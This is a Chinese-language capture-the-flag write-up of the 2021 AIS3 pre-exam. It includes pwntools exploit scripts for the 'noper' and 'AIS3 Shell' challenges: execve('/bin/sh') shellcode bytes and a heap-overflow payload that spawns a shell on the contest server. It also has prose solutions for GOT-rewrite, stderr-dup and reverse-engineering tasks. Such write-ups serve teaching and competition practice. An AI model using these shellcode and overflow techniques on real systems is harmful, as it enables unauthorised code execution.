# 2021 AIS3 pre-exam reverse 和 pwn 題

## pwn : noper

shellcode 題，先輸入一串最長 0x40 的  shellcode，接著隨機 nop 掉 shellcode 的某些 bytes 並執行。

因為有隨機 nop，所以直接塞 execve('/bin/sh' , 0 , 0) 一類的 shellcode 有很高的機率會直接 crash 掉，好在執行 shellcode 時，rax 是 read 的 syscall number，rdi 是 0  ( stdin )，rsi 是 shellcode 第一個 bytes 的位置，可以塞 syscall 複寫 shellcode。需要注意的是因為 rdx 太大 , 直接 syscall 不能成功，所以還要在 syscall 前塞一個盡量短一點的指令減小 rdx 的值 ( ex. shr , xor ... )

```python=
from pwn import *

#p = process('./noper')
p = remote('quiz.ais3.org' , 5002)
pause()
p.recvuntil('code:')
sc = '\x48\xC1\xEA\x29' # shr rdx , 0x29 
sc += '\x0f\x05' # syscall
p.sendline(sc)
sc = '\x90'*6 + '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05' # execve('/bin/sh')
p.sendline(sc)    

p.interactive()
```

## pwn : Write Me


程式先把 system 的 got 寫 0，再給一次任意寫的機會，寫完後呼叫 system('/bin/sh')。

方法是直接把 got 寫回 dlruntime_resolve 前的值，讓下次程式執行 system 時再做一次 lazy binding 填回正確的位置。


## pwn : AIS3 Shell

出題者在原有的 ptmalloc 上自己寫了一套記憶體分配機制，這套分配機制存在邏輯錯誤，導致使用者可以分配比自己申請的大小還大的記憶體，造成 heap overflow 的漏洞。

初始化 MEM pool 函數。

![](https://i.imgur.com/PkAzkxo.png)

分配記憶體函數，MEM[i<<6+4] 邏輯錯誤，能夠申請到比自己申請大小更大的記憶體。

![](https://i.imgur.com/Hpxabg4.png)

```python
from pwn import *
p = remote('quiz.ais3.org' , 10103)
#p = process('./ais3shell')
pause()

def define_cmd(sz1 , cmdname , sz2 , cmd):
    p.recvuntil('$')
    p.sendline('define')
    p.recvuntil('name:')
    p.sendline(str(sz1))
    p.recvuntil('name:')
    p.sendline(cmdname)
    p.recvuntil('command:')
    p.sendline(str(sz2))
    p.recvuntil('Command:')
    p.sendline(cmd)

def run_cmd(cmdname):
    p.recvuntil('$')
    p.sendline('run ' + cmdname)

def list_cmd():
    p.recvuntil('$')
    p.sendline('list')

define_cmd(256 , 'aaa' , 768 , 'ls') 
pl = 'a'*272+'/bin/sh' # overflow 到下一個 chunk 的 cmd
define_cmd(512 , pl , 10 , 'sl')
#list_cmd()
run_cmd('aaa')

p.interactive()
```

## misc : Blind

 
程式關閉 stdin 後讓使用者執行一個 syscall，最後再執行 system("/bin/sh")。

沒辦法寫入字串 , 無法 reopen tty , 後來注意到 stderr 沒關，所以 syscall 執行 dup stderr。

## reverse : Piano

給一個執行檔 piano.exe 和用 c# 寫的動態連結檔 piano.dll，遊戲的函數全部都定義在 dll 內。

![](https://i.imgur.com/6eJsuHa.png)

動態追蹤後發現當按下鋼琴鍵時，會進入 onClickHandler 處理函數，在函數內以 FILO 的順序將鋼琴鍵對應的數值存入 notes[14]。

![](https://i.imgur.com/8n00C96.png)

每次進入 handler 時都會檢查一次 notes 的 14 個數值是否有符合特定規則，有的話就呼叫 nya 彈 flag。

由規則可知，只要解 14 個二元一次方程式就可以知道要依序彈奏哪 14 個音符。

![](https://i.imgur.com/KmwmVmX.png)

## reverse : COLORS

在 encode.js 內發現了一個 eventlistner , 追蹤下去發現只要執行 "上上下下左右左右ba" 就可以解鎖 input 的 locked ( return document )

![](https://i.imgur.com/nn4bn3L.png)

解鎖 input 的 locked 以後跳出一隻很醜的動物 , 顯示字串 `"Here is your "encoded" flag , input to encode something else!"`

return 回來的 document 上的字符是由 _0xce93 encode 的 , 所以只要 trace _0xce93 找出規則後 decode 回來即可
